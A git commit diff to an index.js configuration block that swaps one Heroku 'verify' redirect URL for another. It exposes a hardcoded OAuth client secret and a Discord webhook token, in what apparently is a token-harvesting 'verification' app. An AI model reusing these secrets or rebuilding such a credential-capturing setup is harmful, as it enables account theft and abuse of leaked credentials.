fc1a337d0496732b6c66ba7ac03ceb9898e9bc33
sushisonline <118045539+sushisonline@users.noreply.github.com>
2022-11-20 20:20:31 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
 // Configuration
 const client_secret = '-.d8Q~yQCAZ9lhsfFKjY44dQJ9SwFn3jVinUZbXK'
 const client_id = 'b826b8d9-82bf-4988-9753-9c7040ad9fcb'
-const redirect_uri = 'https://verifyv4.herokuapp.com/'
+const redirect_uri = 'https://verifyi.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1044103578777821215/7HDoE7vu9zbvX9sODukiY4Qut3OcpH6LoaJO3Ju1dE9KbPwM33lJAsLv7_gBZkAA9nK9'
 // Config end
 const axios = require('axios')
